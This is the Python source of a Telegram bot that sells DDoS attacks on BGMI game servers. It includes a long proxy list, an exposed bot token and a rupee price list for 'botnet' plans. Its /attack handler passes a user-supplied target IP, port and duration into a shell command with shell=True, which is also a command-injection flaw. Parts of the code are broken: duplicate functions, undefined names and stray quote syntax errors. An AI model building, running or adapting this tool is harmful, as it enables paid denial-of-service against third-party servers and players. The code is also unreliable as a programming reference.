#bgmiddoserpython

import telebot
import subprocess
import datetime
import os

# insert your Telegram bot token here
bot = telebot.TeleBot('7018906642:AAGFGHyBrzZZwga4w4z1v_T9CGohm6NGC-I')

# Admin user IDs
admin_id = ["5181364124"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"


# Join :- @tanmaypaul21 # List of proxy addresses
PROXIES = [
    "https://192.73.244.36:80",
"https://198.49.68.80:80",
"https://148.72.140.24:30127",
"https://209.97.150.167:8080",
"https://159.65.245.255:80",
"https://162.223.94.164:80",
"https://216.137.184.253:80",
"https://35.185.196.38:3128",
"https://172.96.117.205:38001",
"https://50.175.212.77:80",
"https://50.173.182.90:80",
"https://50.172.75.127:80",
"https://50.223.239.167:80",
"https://50.171.122.30:80",
"https://50.223.246.237:80",
"https://50.223.239.175:80",
"https://50.222.245.40:80",
"https://50.223.239.177:80",
"https://50.222.245.41:80",
"https://50.174.7.158:80",
"https://50.168.72.122:80",
"https://50.171.187.50:80",
"https://50.223.239.168:80",
"https://50.223.239.161:80",
"https://50.223.239.160:80",
"https://50.171.187.51:80",
"https://50.169.135.10:80",
"https://50.207.199.86:80",
"https://50.217.226.44:80",
"https://50.172.75.122:80",
"https://50.174.145.9:80",
"https://50.172.75.120:80",
"https://50.221.230.186:80",
"https://50.222.245.47:80",
"https://198.199.86.11:8080",
"https://54.67.125.45:3128",
"https://44.195.247.145:80",
"https://13.59.156.167:3128",
"https://18.223.25.15:80",
"https://3.212.148.199:3128",
"https://3.21.101.158:3128",
"https://52.73.224.54:3128",
"https://44.219.175.186:80",
"https://50.174.7.153:80",
"https://50.168.163.179:80",
"https://50.174.7.154:80",
"https://50.217.226.45:80",
"https://50.221.74.130:80",
"https://50.168.72.118:80",
"https://50.207.199.87:80",
"https://50.217.226.40:80",
"https://50.168.72.115:80",
"https://50.174.7.155:80",
"https://50.217.226.46:80",
"https://50.168.7.250:80",
"https://50.218.204.103:80",
"https://50.145.24.176:80",
"https://50.223.239.173:80",
"https://50.145.24.181:80",
"https://24.205.201.186:80",
"https://13.56.163.250:3128",
"https://47.251.43.115:33333",
"https://198.44.255.5:80",
"https://162.223.94.166:80",
"https://198.199.70.20:31028",
"https://66.191.31.158:80",
"https://13.56.192.187:80",
"https://172.183.241.1:8080",
"https://50.222.245.42:80",
"https://50.168.163.182:80",
"https://50.168.72.119:80",
"https://50.239.72.19:80",
"https://68.185.57.66:80",
"https://50.145.24.186:80",
"https://50.144.161.162:80",
"https://72.169.67.109:87",
"https://50.223.239.190:80",
"https://50.223.239.185:80",
"https://50.168.72.116:80",
"https://50.231.172.74:80",
"https://50.174.145.14:80",
"https://50.222.245.45:80",
"https://50.222.245.46:80",
"https://50.144.161.167:80",
"https://50.223.246.226:80",
"https://50.172.75.124:80",
"https://50.168.163.176:80",
"https://50.174.145.10:80",
"https://50.169.37.50:80",
"https://32.223.6.94:80",
"https://50.172.39.98:80",
"https://50.175.212.79:80",
"https://50.174.145.13:80",
"https://154.208.10.126:80",
"https://50.172.75.123:80",
"https://50.174.7.162:80",
"https://3.12.144.146:3128",
"https://50.239.72.17:80",
"https://50.174.7.156:80",
"https://50.168.163.180:80",
"https://50.231.110.26:80",
"https://50.168.163.178:80",
"https://50.174.7.157:80",
"https://50.217.226.43:80",
"https://50.207.199.82:80",
"https://50.168.72.113:80",
"https://50.207.199.83:80",
"https://50.202.75.26:80",
"https://50.168.163.166:80",
"https://50.175.212.76:80",
"https://34.23.45.223:80",
"https://12.186.205.122:80",
"https://50.230.222.202:80",
"https://50.144.166.226:80",
"https://50.222.245.43:80",
"https://50.222.245.50:80",
"https://50.223.239.194:80",
"https://50.144.168.74:80",
"https://50.171.177.124:80",
"https://50.223.239.191:80",
"https://50.223.38.6:80",
"https://4.155.2.13:9480",
"https://50.174.7.152:80",
"https://50.168.163.177:80",
"https://50.168.72.117:80",
"https://68.178.203.69:8899",
"https://50.239.72.18:80",
"https://50.217.226.47:80",
"https://50.207.199.84:80",
"https://50.174.145.8:80",
"https://50.168.72.114:80",
"https://50.168.163.183:80",
"https://50.207.199.81:80",
"https://50.168.163.181:80",
"https://50.239.72.16:80",
"https://50.223.239.165:80",
"https://50.217.226.42:80",
"https://50.174.7.159:80",
"https://103.170.155.104:3128",
"https://162.240.75.37:80",
"https://137.184.121.54:80",
"https://160.72.98.165:3128",
"https://192.210.236.54:3128",
"https://50.223.239.183:80",
"https://156.239.48.42:3128",
"https://69.58.9.119:7189",
"https://173.214.176.84:6055",
"https://104.165.127.25:3128",
"https://43.245.116.203:6718",
"https://156.239.53.234:3128",
"https://157.52.233.50:5677",
"https://104.165.169.254:3128",
"https://104.165.169.218:3128",
"https://45.41.160.253:6235",
"https://134.73.70.39:6283",
"https://192.186.176.160:8210",
"https://104.207.45.131:3128",
"https://161.123.93.27:5757",
"https://172.245.157.99:6684",
"https://161.123.130.142:5813",
"https://156.239.52.221:3128",
"https://104.207.32.96:3128",
"https://104.165.127.166:3128",
"https://104.165.127.87:3128",
"https://104.207.56.116:3128",
"https://207.244.217.82:6629",
"https://45.141.81.10:6070",
"https://156.239.53.254:3128",
"https://156.239.53.97:3128",
"https://134.73.69.178:6168",
"https://104.207.44.40:3128",
"https://23.228.83.31:5727",
"https://12.163.95.161:8080",
"https://38.170.171.133:5833",
"https://156.239.52.150:3128",
"https://156.239.53.182:3128",
"https://147.124.198.205:6064",
"https://154.16.146.44:80	",
"https://142.111.1.84:5116",
"https://156.239.49.31:3128",
"https://172.245.157.171:6756",
"https://206.206.64.212:6173",
"https://206.206.122.34:5665",
"https://107.179.114.75:5848",
"https://156.239.52.138:3128",
"https://156.239.50.229:3128",
"https://104.207.35.225:3128",
"https://107.173.137.249:6503",
"https://134.73.64.15:6300",
"https://156.239.49.201:3128",
"https://134.73.65.97:6649"
    # Join :- @tanmaypaul21 # Add more proxy addresses as needed
]

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Join :- @tanmaypaul21 # Function to read free user IDs and their credits from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file

def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass


# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found."
            else:
                file.truncate(0)
                response = "Logs cleared successfully"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} Added Successfully."
            else:
                response = "User already exists."
        else:
            response = "Please specify a user ID to add."
    else:
        response = "Only Admin Can Run This Command."

    bot.reply_to(message, response)



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} 𝗿𝗲𝗺𝗼𝘃𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 👍."
            else:
                response = f"User {user_to_remove} not found in the list."
        else:
            response = '''Please Specify A User 𝗜𝗗 𝘁𝗼 𝗥𝗲𝗺𝗼𝘃𝗲. 
✅ 𝗨𝘀𝗮𝗴𝗲: /remove <userid>'''
    else:
        response = "𝙏𝙪 𝙖𝙙𝙢𝙞𝙣 𝙝𝙖𝙞 𝙠𝙮𝙖 𝙨𝙖𝙖𝙡𝙚😂."

    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully"
        except FileNotFoundError:
            response = "𝗟𝗼𝗴𝘀 𝗰𝗹𝗲𝗮𝗿𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 ✅"
    else:
        response = "𝙏𝙪 𝙖𝙙𝙢𝙞𝙣 𝙝𝙖𝙞 𝙠𝙮𝙖 𝙨𝙖𝙖𝙡𝙚😂."
    bot.reply_to(message, response)

 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found"
        except FileNotFoundError:
            response = "No data found"
    else:
        response = "𝙏𝙪 𝙖𝙙𝙢𝙞𝙣 𝙝𝙖𝙞 𝙠𝙮𝙖 𝙨𝙖𝙖𝙡𝙚😂."
    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found."
                bot.reply_to(message, response)
        else:
            response = "No data found"
            bot.reply_to(message, response)
    else:
        response = "𝙏𝙪 𝙖𝙙𝙢𝙞𝙣 𝙝𝙖𝙞 𝙠𝙮𝙖 𝙨𝙖𝙖𝙡𝙚😂."
        bot.reply_to(message, response)


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"Your ID: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = "🚀𝘼𝙩𝙩𝙖𝙘𝙠 𝙨𝙩𝙖𝙧𝙩𝙚𝙙 𝙤𝙣🔫\n🎯𝙄𝙋: {target}\n🏖️𝙋𝙤𝙧𝙩: {port}\n⌚𝙏𝙞𝙢𝙚: {time} 𝙨𝙚𝙘."
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Handler for /bgmi command
@bot.message_handler(commands=['attack'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 60:
                response = "You Are On Cooldown. Please Wait 1min Before Running The /bgmi Command Again."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert time to integer
            time = int(command[3])  # Convert port to integer
            if time > 5000:
                response = "Error: Time interval must be less than 300."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 100"
                subprocess.run(full_command, shell=True)
                response = f"🚀𝘼𝙩𝙩𝙖𝙘𝙠 𝙤𝙣 ☄️ {target}:{port}\n🎉𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚𝙙 🎊𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮🥳"
        else:
            response = "🤦‍♂️𝙐𝙨𝙖𝙜𝙚: /𝙗𝙜𝙢𝙞 <𝙞𝙥> <𝙥𝙤𝙧𝙩> <𝙩𝙞𝙢𝙚_𝙨𝙚𝙘𝙤𝙣𝙙𝙨>\n\n🤷‍♀️𝙀𝙭𝙖𝙢𝙥𝙡𝙚  /attack 20.235.94.237 17870 120"  # Join :- @tanmaypaul21 # Updated command syntax 
    else:
        response = " 𝘼𝙘𝙘𝙚𝙨𝙨 𝙙𝙚𝙣𝙞𝙚𝙙\n𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩\n𝙠𝙞𝙣𝙙𝙡𝙮 𝘿𝙢 @tanmaypaul21 𝙏𝙤 𝙂𝙚𝙩 𝘼𝙘𝙘𝙚𝙨𝙨"

    bot.reply_to(message, response)



# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "No Command Logs Found For You."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = " 𝘼𝙘𝙘𝙚𝙨𝙨 𝙙𝙚𝙣𝙞𝙚𝙙\n𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩\n𝙠𝙞𝙣𝙙𝙡𝙮 𝘿𝙢 @tanmaypaul21 𝙏𝙤 𝙂𝙚𝙩 𝘼𝙘𝙘𝙚𝙨𝙨"

    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''Available commands:
 /bgmi : Method For Bgmi Servers. 
 /rules : Please Check Before Use !!.
 /mylogs : To Check Your Recents Attacks.
 /plan : Checkout Our Botnet Rates.

 To See Admin Commands:
 /admincmd : Shows All Admin Commands.
 By TaNMaY @tanmaypaul21
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 𝘽𝙂𝙈𝙄 𝘼𝙩𝙩𝙖𝙘𝙠 𝘽𝙤𝙩! 🚀\n𝙏𝙝𝙞𝙨 𝙗𝙤𝙩 𝙖𝙡𝙡𝙤𝙬𝙨 𝙮𝙤𝙪 𝙩𝙤 𝙡𝙖𝙪𝙣𝙘𝙝 𝙖 𝘽𝙂𝙈𝙄 𝙖𝙩𝙩𝙖𝙘𝙠 𝙤𝙣 𝙖 𝙩𝙖𝙧𝙜𝙚𝙩 𝙄𝙋 𝙖𝙣𝙙 𝙥𝙤𝙧𝙩.\n𝙗𝙜𝙢𝙞 <𝙞𝙥> <𝙥𝙤𝙧𝙩> <𝙩𝙞𝙢𝙚_𝙨𝙚𝙘𝙤𝙣𝙙𝙨>\n𝙀𝙭𝙖𝙢𝙥𝙡𝙚: /𝙗𝙜𝙢𝙞 20.235.94.237 17870 120'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules:

𝟭. 𝗗𝗼𝗻𝘁 𝗥𝘂𝗻 𝗧𝗼𝗼 𝗠𝗮𝗻𝘆 𝗔𝘁𝘁𝗮𝗰𝗸𝘀 !! 𝗖𝗮𝘂𝘀𝗲 𝗔 𝗕𝗮𝗻 𝗙𝗿𝗼𝗺 𝗕𝗼𝘁
𝟮. 𝗗𝗼𝗻𝘁 𝗥𝘂𝗻 𝟮 𝗔𝘁𝘁𝗮𝗰𝗸𝘀 𝗔𝘁 𝗦𝗮𝗺𝗲 𝗧𝗶𝗺𝗲 𝗕𝗲𝗰𝘇 𝗜𝗳 𝗨 𝗧𝗵𝗲𝗻 𝗨 𝗚𝗼𝘁 𝗕𝗮𝗻𝗻𝗲𝗱 𝗙𝗿𝗼𝗺 𝗕𝗼𝘁. 
𝟯. 𝗪𝗲 𝗗𝗮𝗶𝗹𝘆 𝗖𝗵𝗲𝗰𝗸𝘀 𝗧𝗵𝗲 𝗟𝗼𝗴𝘀 𝗦𝗼 𝗙𝗼𝗹𝗹𝗼𝘄 𝘁𝗵𝗲𝘀𝗲 𝗿𝘂𝗹𝗲𝘀 𝘁𝗼 𝗮𝘃𝗼𝗶𝗱 𝗕𝗮𝗻!!'''
By TaNMaY @tanmaypaul21'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:

Vip :
💥 Attack Time : 200 (S)
💥 After Attack Limit : 2 Min
💥 Concurrents Attack : 300

Rate List:
Day-->70 Rs
Week-->270 Rs
Month-->800 Rs
Full Season-->2000 Rs
By TaNMaY @tanmaypaul21
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

💥 /add <userId> : Add a User.
💥 /remove <userid> Remove a User.
💥 /allusers : Authorised Users Lists.
💥 /logs : All Users Logs.
💥 /broadcast : Broadcast a Message.
💥 /clearlogs : Clear The Logs File.
By TaNMaY @tanmaypaul21
'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗧𝗼 𝗔𝗹𝗹 𝗨𝘀𝗲𝗿𝘀 👍."
        else:
            response = "🤖 𝗣𝗹𝗲𝗮𝘀𝗲 𝗣𝗿𝗼𝘃𝗶𝗱𝗲 𝗔 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 𝗧𝗼 𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁."
    else:
        response = ""𝙏𝙪 𝙖𝙙𝙢𝙞𝙣 𝙝𝙖𝙞 𝙠𝙮𝙖 𝙨𝙖𝙖𝙡𝙚😂."

    bot.reply_to(message, response)




while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
#By @tanmaypaul21